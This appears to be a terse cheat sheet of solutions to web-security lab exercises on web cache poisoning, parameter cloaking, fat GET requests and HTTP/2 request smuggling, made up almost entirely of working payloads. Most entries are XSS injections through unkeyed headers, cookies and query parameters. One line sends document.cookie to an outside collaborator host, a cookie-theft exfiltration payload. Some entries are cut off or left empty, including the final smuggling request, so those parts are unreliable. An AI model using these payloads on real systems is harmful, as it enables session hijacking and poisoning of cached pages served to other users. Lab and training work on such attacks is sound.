- Web cache poisoning with an unkeyed cookie - fehost=someString"-alert(1)-"someString
    
- Using web cache poisoning to deliver an XSS attack -  
    X-Forwarded-Host: a."><script>alert(1)</script>"
    
- Web cache poisoning with multiple headers:  
    GET request for the JavaScript file /resources/js/[tracking.js](http://tracking.js) - send it to Burp Repeater  
    X-Forwarded-Host: EXPLOIT-SERVER_ID.exploit-server.net  
    X-Forwarded-Scheme: nothttps  
    Go to the exploit server and change the file name to match the path used by the vulnerable response:  /resources/js/[tracking.js](http://tracking.js) In the body, enter the payload alert(document.cookie) and store the exploit.
    
- Web cache poisoning via an unkeyed query string - GET /?evil='/><script>alert(1)</script>
    
- Web cache poisoning via an unkeyed query parameter:  Use Param Miner's "Guess GET parameters" feature to identify that the parameter utm_content is supported by the application.  
    GET /?utm_content='/><script>alert(1)</script>
    
- Parameter cloaking - Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.  
    GET /js/[geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)](http://geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert\(1\))
    

GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2

- Web cache poisoning via a fat GET request -  GET /js/geolocate.js?callback=setCountryCookie
    

…

callback=alert(1)

- URL normalization - GET /random</p><script>alert(1)</script><p>foo
    
- Using web cache poisoning to exploit unsafe handling of resource imports: 
    
- HTTP/2 smuggling via CRLF injection
    

0

  

POST / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=HACKER-SESSION-COOKIE

Content-Length: 800

  

search=

